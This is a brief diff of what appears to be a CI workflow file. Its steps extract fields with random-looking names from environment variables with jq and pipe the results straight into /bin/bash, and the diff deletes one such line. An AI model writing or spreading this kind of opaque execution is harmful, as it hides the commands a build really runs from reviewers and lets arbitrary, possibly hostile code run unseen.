@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$ep3" | jq -r .dx5825 | /bin/bash
           echo $so11 | jq -r .sfqxl56682 | /bin/bash
-          echo $vejg318 | jq -r .nrbw91979 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
